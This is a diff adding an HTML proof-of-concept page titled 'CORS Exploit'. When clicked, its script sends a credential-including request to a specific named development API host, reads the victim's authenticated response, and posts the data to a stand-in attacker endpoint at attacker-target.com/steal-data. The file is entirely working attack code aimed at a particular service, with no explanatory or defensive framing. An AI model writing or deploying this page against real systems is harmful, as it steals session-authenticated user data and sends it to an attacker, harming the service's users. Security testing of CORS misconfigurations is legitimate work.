@@ -1,0 +1,40 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>CORS Exploit</title>
+</head>
+<body>
+    <h1>CORS Exploit</h1>
+    <p>Click the button below to send a cross-origin request to the vulnerable API.</p>
+    <button id="exploitButton">Exploit CORS</button>
+    
+    <script>
+        // Function to trigger the exploit when the button is clicked
+        document.getElementById('exploitButton').addEventListener('click', function() {
+            // Craft a request to the vulnerable API that supports CORS misconfiguration
+            fetch('http://vera-devel.api.verily.com', {
+                method: 'GET',  // Use GET, POST, or any other method depending on the API
+                headers: {
+                    'Content-Type': 'application/json',  // Customize as needed
+                },
+                credentials: 'include'  // Include cookies (session tokens) and authentication with the request
+            })
+            .then(response => response.json())  // Parse the JSON response
+            .then(data => {
+                console.log('Sensitive Data:', data);  // Log the sensitive data or send it to the attacker
+                // If the server sends sensitive information, send it back to the attacker via another request
+                fetch('https://attacker-target.com/steal-data', {
+                    method: 'POST',
+                    headers: {
+                        'Content-Type': 'application/json',
+                    },
+                    body: JSON.stringify({ stolenData: data })
+                });
+            })
+            .catch(error => console.error('Error:', error));  // Log any errors if they occur
+        });
+    </script>
+</body>
+</html>
